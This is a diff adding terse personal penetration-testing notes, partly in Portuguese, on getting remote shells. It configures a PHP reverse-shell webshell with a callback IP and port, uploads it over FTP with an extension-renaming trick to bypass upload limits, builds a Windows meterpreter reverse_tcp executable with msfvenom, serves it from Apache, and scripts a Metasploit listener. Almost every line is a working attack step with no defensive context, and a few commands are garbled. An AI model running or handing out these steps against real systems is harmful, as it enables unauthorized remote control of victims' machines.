@@ -26,3 +26,36 @@ WEBSHELL SITE PHP
 Kali /usr/share/webshells/php-reverse-shell.php
 $ip = '192.168.0.27';  // CHANGE THIS
 $port = 4444;   // CHANGE THIS
+
+python -m IP 80
+ftp get php-reverse-shell.php
+
+ls -la (permissions)
+if not permission to upload, rename extension
+
+AUTOMATED METERPRETER
+
+ip addr
+ifconfig
+
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 LHOST=192.168.0.27 LPORT=444 -f exe -o payload_win7.exe
+
+service apache2 start
+payload em /var/www/html
+nc -nvlp 4444
+
+explorer no Win 7: http://192.168.0.22/payload.exe
+
+OR
+msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+establishes a listener
+
+(msf6 exploit(multi/handler) > makerc handler_tcp.rc
+[*] Saving last 8 commands to handler_tcp.rc)
+
+gedit handler_tcp.rc&
+(add "run")
+
+└─# msfconsole -r handler_tcp.rc
+
+
